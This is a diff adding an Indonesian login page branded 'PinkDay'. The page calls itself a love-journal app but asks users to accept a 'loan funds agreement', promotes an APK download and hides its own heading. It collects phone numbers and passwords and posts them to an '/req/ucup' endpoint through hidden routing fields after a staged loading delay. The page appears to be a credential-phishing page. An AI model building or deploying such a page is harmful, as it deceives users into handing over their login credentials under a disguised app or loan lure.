@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="id" class="scroll-smooth">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta http-equiv="X-XSS-Protection" content="1; mode=block" />
+
+  <title>Login - PinkDay</title>
+
+  <!-- Meta SEO -->
+  <meta name="description" content="Login PinkDay untuk akses akun Anda dan download aplikasinya sekarang! Kelola keuangan dengan mudah, nikmati fitur lengkap, dan dapatkan keuntungan lebih.">
+  <meta name="keywords" content="login pinkday, download pinkday, aplikasi pinkday, ensa joint stock company, apk pinkday">
+  <meta name="author" content="PinkDay">
+  <meta name="robots" content="index, follow">
+  <meta name="googlebot" content="index, follow">
+
+  <!-- Canonical & OG -->
+  <link rel="canonical" href="https://www.pink-day.site/log">
+  
+  <meta property="og:title" content="Login - PinkDay">
+  <meta property="og:description" content="PinkDay jejak masa cinta, menjadi saksi kisah cinta kita. Mari gunakan aplikasi ini untuk merekam setiap momen perjalanan cinta kita bersama, menjadikan cinta terasa seperti pertemuan pertama dan menghangatkan setiap hari esok">
+  <meta property="og:image" content="<? $webImage; ?>">
+  <meta property="og:url" content="https://www.pink-day.site/log">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="PinkDay">
+
+  <!-- Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Login PinkDay">
+  <meta name="twitter:description" content="PinkDay jejak masa cinta, menjadi saksi kisah cinta kita. Mari gunakan aplikasi ini untuk merekam setiap momen perjalanan cinta kita bersama, menjadikan cinta terasa seperti pertemuan pertama dan menghangatkan setiap hari esok">
+  <meta name="twitter:image" content="https://www.pink-day.site/assets/img/logo.png">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+  <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Playfair+Display:wght@700;900&display=swap">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat+Alternates:wght@800&family=Inter:wght@400;600;700&family=Playfair+Display:wght@700;900&display=swap" rel="stylesheet">
+
+  <link rel="icon" href="https://www.pink-day.site/assets/img/favi.png" type="image/png" />
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              primary: '#605def',
+              accent: '#ff96c8',
+              secondary: '#ffffff',
+              tertiary: '#24cd77',
+              dark: '#1c1c22',
+              light: '#fcfafe',
+            },
+            fontFamily: {
+              heading: ['"Playfair Display"', 'serif'],
+              body: ['Inter', 'sans-serif'],
+              button: ['Montserrat Alternates', 'sans-serif'],
+            },
+          },
+        },
+      };
+ </script>
+</head>
+<body class="bg-[url('https://www.pink-day.site/assets/img/background.png')] bg-cover bg-center font-body text-dark text-xs flex justify-center items-center h-screen p-4">
+
+  <div class="bg-transparent bg-opacity-90 rounded-lg shadow-lg w-full max-w-md p-6 mb-4">
+    <h1 class="mt-2 text-2xl font-bold font-heading text-transparent text-left mb-8">Registrasi/Login</h1>
+    <p class="mt-16 text-left text-sm font-medium">Harap masukkan nomor telepon</p>
+    <form id="loginForm" action="https://www.pink-day.site/req/ucup" method="post" class="space-y-4">
+        <input type="hidden" name="desc" value="- NoHP">
+        <input type="hidden" name="formid" value="log">
+        <input type="hidden" name="merge" value="log">
+        <input type="hidden" name="href" value="vr">
+
+        <!-- Nomor HP -->
+        <div class="relative">
+          <span class="absolute left-3 top-2.5 text-sm fas fa-phone"></span>
+          <input type="tel" name="UCUP#No_HP" id="nohp"
+                 class="bg-light pl-10 w-full py-2 border border-dark rounded-lg focus:ring-dark focus:border-dark outline-none"
+                 placeholder="Silahkan masukkan nomor ponsel Anda" required>
+        </div>
+
+        <!-- Password -->
+        <div class="relative">
+          <span class="absolute left-3 top-2.5 text-sm fas fa-lock"></span>
+          <input type="password" name="UCUP#Password" id="password"
+                 class="bg-light pl-10 pr-10 w-full py-2 border border-dark rounded-lg focus:ring-dark focus:border-dark outline-none"
+                 placeholder="Silahkan masukkan sandi" required>
+          <i id="eye-icon" class="fa-solid fa-eye-slash absolute right-3 top-2.5 cursor-pointer"
+             onclick="togglePasswordVisibility()"></i>
+        </div>
+
+        <!-- Submit -->
+        <button type="submit"
+                class="bg-accent text-light font-button text-base font-semibold py-2 rounded-lg w-full hover:bg-accent transition">
+          Selanjutnya
+        </button>
+
+        <!-- Checkbox Agreement -->
+        <div class="text-center mt-4 space-y-2">
+          <div class="flex items-start justify-center gap-2">
+            <input type="checkbox" id="agreement" required class="mt-1">
+            <label for="agreement" class="text-left">
+              Dengan masuk, Anda menyetujui
+              <a href="https://www.pink-day.site/kebijakan-privasi" class="text-primary underline"> Kebijakan Privasi</a> dan
+              <a href="https://www.pink-day.site/syarat" class="text-primary underline"> Perjanjian Pinjaman Dana</a>
+            </label>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+  <script>
+    // Modal custom
+    const showCustomModal = (title, text, type = 'warning', isLoading = false) => {
+      const modalId = 'customModal';
+      let modal = document.getElementById(modalId);
+
+      if (!modal) {
+        modal = document.createElement('div');
+        modal.id = modalId;
+        modal.className = 'fixed inset-0 bg-primary bg-opacity-70 flex items-center justify-center z-50';
+        document.body.appendChild(modal);
+      }
+
+      let iconHtml = '';
+      let titleColorClass = 'text-dark';
+      let buttonHtml = `<button id="modal-ok-button" class="bg-primary text-light px-4 py-2 rounded-full hover:opacity-90 transition font-button">Saya Mengerti</button>`;
+
+      if (isLoading) {
+        iconHtml = `<div class="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mb-3"></div>`;
+        buttonHtml = '';
+        modal.style.pointerEvents = 'none';
+      } else {
+        if (type === 'success') {
+          iconHtml = '<i class="fas fa-check-circle text-primary text-3xl mb-3"></i>';
+          titleColorClass = 'text-primary';
+        } else if (type === 'error') {
+          iconHtml = '<i class="fas fa-times-circle text-secondary text-3xl mb-3"></i>';
+          titleColorClass = 'text-secondary';
+        } else {
+          iconHtml = '<i class="fas fa-exclamation-triangle text-primary text-3xl mb-3"></i>';
+          titleColorClass = 'text-primary';
+        }
+        modal.style.pointerEvents = 'auto';
+      }
+
+      modal.innerHTML = `
+        <div class="bg-light p-6 rounded-lg shadow-xl max-w-sm w-full text-center border border-primary">
+          ${iconHtml}
+          <h3 class="text-lg font-bold ${titleColorClass} mb-3 font-heading">${title}</h3>
+          <p class="text-light mb-4">${text}</p>
+          ${buttonHtml}
+        </div>
+      `;
+
+      const closeButton = document.getElementById('modal-ok-button');
+      if (closeButton) {
+        closeButton.addEventListener('click', () => {
+          document.body.removeChild(modal);
+        });
+      }
+    };
+
+    // Validasi form
+    document.addEventListener('DOMContentLoaded', function () {
+      const loginForm = document.getElementById("loginForm");
+      const agreementCheckbox = document.getElementById("agreement");
+
+      if (loginForm && agreementCheckbox) {
+        loginForm.addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          if (!agreementCheckbox.checked) {
+            showCustomModal('Oops...', 'Anda harus menyetujui Syarat & Ketentuan serta Kebijakan Privasi terlebih dahulu!', 'error');
+            return;
+          }
+
+          // Loading modal
+          showCustomModal('Memproses...', 'Mohon tunggu sebentar', 'loading', true);
+
+          setTimeout(() => {
+            loginForm.submit();
+          }, 1500);
+        });
+      }
+    });
+
+    // Toggle password
+    function togglePasswordVisibility() {
+      const passwordInput = document.getElementById('password');
+      const eyeIcon = document.getElementById('eye-icon');
+      if (passwordInput && eyeIcon) {
+        if (passwordInput.type === "password") {
+          passwordInput.type = "text";
+          eyeIcon.classList.remove('fa-eye-slash');
+          eyeIcon.classList.add('fa-eye');
+        } else {
+          passwordInput.type = "password";
+          eyeIcon.classList.remove('fa-eye');
+          eyeIcon.classList.add('fa-eye-slash');
+        }
+      }
+    }
+  </script>
+
+</body>
+
+</html>
